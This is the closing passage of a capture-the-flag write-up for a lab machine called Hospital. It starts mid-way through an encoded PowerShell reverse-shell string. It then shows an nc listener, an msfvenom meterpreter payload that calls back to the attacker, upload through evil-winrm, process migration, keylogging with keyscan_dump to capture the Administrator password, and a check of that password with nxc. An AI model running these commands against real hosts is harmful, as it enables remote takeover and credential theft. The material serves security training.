wBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAAoACgA=
```

![image.png]({{ site.baseurl }}/assets/hospital/image%2028.png)

And start a listener before sending:

```bash
nc -lnvp 9001
```

![image.png]({{ site.baseurl }}/assets/hospital/image%2029.png)

We are now administrator. 

This is the other way. First, let’s check who’s logged in:

```bash
qwinsta

 SESSIONNAME       USERNAME                 ID  STATE   TYPE        DEVICE
>services                                    0  Disc
 console           drbrown                   1  Active
 rdp-tcp                                 65536  Listen
```

We are session ID 0, session name services. There is also another session active; session 1 also logged in as drbrown in a console.

We need a meterpreter reverse shell. Let’s generate one with msfvenom:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=4444 -f exe -o rev.exe
```

Now, from our evil-winrm session, upload our payload:

```bash
upload rev.exe
```

Now let’s start our listener:

```bash
msfconsole
use exploit/multi/handler
set lhost tun0
set lport 4444
set payload windows/x64/meterpreter/reverse_tcp  
run
```

Now execute our payload on evil-winrm.

We now have session. Now let’s migrate to a process on session one. Use `ps` to show running processes, and choose a stable process like explorer.exe:

```bash
ps 

<SNIP>
7312   7248  explorer.exe             x64   1        HOSPITAL\drbrown  C:\Windows\explorer.exe

```

Now migrate:

```bash
migrate 7312

[*] Migrating from 10412 to 7312...
[*] Migration completed successfully.
```

Now let’s start key logger:

```bash
keyscan_start
```

After a while, when we think the user has typed enough, let’s dump what we captured:

```bash
keyscan_dump

AdministratorTh3b3sth0sp1t4l9786!

####we do this a couple of times, every time we wait around 2 minutes, as the password typed everytime is slightly different

keyscan_dump

Dumping captured keystrokes...
Administratorth3B3sth0sp1t4l97861

keyscan_dump

AdministratorTh3B3sth0sp1t4l9786!

keyscan_dump

AdministratorTh3B3stH0sp1t4l9786!

```

Let’s assume the Administrator is the password, the second part must be the password. Let’s use nxc to verify:

```bash
nxc smb hospital.htb -u Administrator -p 'Th3b3sth0sp1t4l9786!' --shares

nxc smb hospital.htb -u Administrator -p 'Th3B3stH0sp1t4l9786!' --shares

SMB         10.10.11.241    445    DC               [+] hospital.htb\Administrator:Th3B3stH0sp1t4l9786! (Pwn3d!)

```

Success. We are now domain admin.